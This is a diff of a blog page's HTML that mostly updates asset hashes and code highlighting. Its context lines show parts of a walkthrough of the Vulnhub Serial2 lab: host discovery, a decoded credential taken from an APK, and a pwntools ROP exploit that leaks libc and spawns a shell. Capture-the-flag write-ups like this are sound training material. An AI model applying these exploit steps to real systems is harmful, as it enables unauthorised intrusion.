@@ -31,7 +31,7 @@ Output of netdiscover.
 
 
 
-<link rel="stylesheet" href="https://hexterisk.github.io/blog/main.min.bc21949b46a7b314448099a92fed1807acac025093285f474b88259eec0c62ba.css">
+<link rel="stylesheet" href="https://hexterisk.github.io/blog/main.min.c8585fd607292199b471f54e83f63f2c9c8b59a00490e9de2e0259cf4b706c23.css">
 
 
 
@@ -52,9 +52,14 @@ Compare the commands I ran, and the formats specified to check where you need to
 IP Discovery Run sudo netdiscover.
 It detects online hosts by sending ARP requests.
 Output of netdiscover.
-192.168.1.10 happens to be the IP of the VM."><meta itemprop="datePublished" content="2020-05-31T00:00:00+00:00" />
-<meta itemprop="dateModified" content="2020-05-31T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1945"><meta itemprop="image" content="https://hexterisk.github.io/blog"/>
+192.168.1.10 happens to be the IP of the VM.">
+<meta itemprop="datePublished" content="2020-05-31T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-05-31T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1945">
+<meta itemprop="image" content="https://hexterisk.github.io/blog"/>
+
+
+
 <meta itemprop="keywords" content="Serial2,Vulnhub,pentesting,penetration,testing,binary," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://hexterisk.github.io/blog"/>
 
@@ -212,7 +217,7 @@ Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/mast
 <p><img src="https://hexterisk.github.io/blog/Serial_2/iB8ei9LOtdAVHXVOZ02R44hDg3H8-uDdN-tEUrtXKWXMd7bDADV6kti3eBVCN7BwVqbwxFakXwLUTPBtlQfiUzu95F5W8u8HQbYoFiNuDFfX3TY6X-wcTaBXm69pBpIlCUh3ASrtYRhdKX1zZw.png" alt="&ldquo;jadx&rdquo;">
 <em>strings.xml file of the apk.</em></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
-print(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;c2s0OmJKNiErbSUqJF0jeDc9TEE=&#34;</span>))
+<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;c2s0OmJKNiErbSUqJF0jeDc9TEE=&#34;</span>))
 </code></pre></div><p><code>sk4:bJ6!+m%*$]#x7=LA</code></p>
 <p>We open postman to make a request to the endpoints we found on the website earlier, and try to use this decoded value as auth credentials.</p>
 <p>We choose the authentication type as Basic Auth and enter:</p>
@@ -382,7 +387,7 @@ print(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>, checksec <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>, checksec <span style="color:#f92672">=</span> False)
 
 offset_binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
 offset_puts <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
@@ -413,27 +418,27 @@ loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009c9</
     chain <span style="color:#f92672">+=</span> p64(plt_puts)
     chain <span style="color:#f92672">+=</span> p64(loop)
     r<span style="color:#f92672">.</span>sendline(chain)
-    print(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
 
     <span style="color:#75715e"># Giving the exit command would cause this function to return, thus transferring</span>
     <span style="color:#75715e"># control our ROP chain.</span>
     r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;exit&#34;</span>)
 
-    print(r<span style="color:#f92672">.</span>recvline())
-    print(r<span style="color:#f92672">.</span>recvline())
-    print(r<span style="color:#f92672">.</span>recvline())
-    print(r<span style="color:#f92672">.</span>recvline())
-    print(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
 
     <span style="color:#75715e"># The last line received contains the leaked address.</span>
     <span style="color:#75715e"># We take out the first 8 bytes, i.e. the base address.</span>
-    leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#66d9ef">False</span>)[:<span style="color:#ae81ff">8</span>]
+    leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(False)[:<span style="color:#ae81ff">8</span>]
     leak <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(leak))
     puts <span style="color:#f92672">=</span> u64(leak)
-    print(<span style="color:#e6db74">&#34;Leaked &#39;puts&#39; address: &#34;</span>, hex(puts))
-    print(<span style="color:#e6db74">&#34;&#39;puts&#39; offset: &#34;</span>, hex(offset_puts))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Leaked &#39;puts&#39; address: &#34;</span>, hex(puts))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#39;puts&#39; offset: &#34;</span>, hex(offset_puts))
     libc_base <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> offset_puts
-    print(<span style="color:#e6db74">&#34;libc base address: &#34;</span>, hex(libc_base))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;libc base address: &#34;</span>, hex(libc_base))
 
     <span style="color:#75715e"># We create a new ROP chain to get the shell.</span>
     chain <span style="color:#f92672">=</span> junk
@@ -445,9 +450,9 @@ loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009c9</
     chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_system)
     r<span style="color:#f92672">.</span>sendline(chain)
 
-    print(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
     r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;exit&#34;</span>)
-    print(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
     r<span style="color:#f92672">.</span>interactive()
 
 <span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
@@ -555,7 +560,7 @@ loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009c9</
 
 
 
-<script type="text/javascript" src="https://hexterisk.github.io/blog/bundle.min.08ccaf9cef8b4e0ebd0b0158e66a7bfc0ddbb2194cdb0099e8814ddb89cc7628b27b1158846564e6e03d9ffc5f4d1bc7dfc274d359f9408d1c63d73a3f7332e9.js" integrity="sha512-CMyvnO&#43;LTg69CwFY5mp7/A3bshlM2wCZ6IFN24nMdiiyexFYhGVk5uA9n/xfTRvH38J001n5QI0cY9c6P3My6Q=="></script>
+<script type="text/javascript" src="https://hexterisk.github.io/blog/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
 
 
 
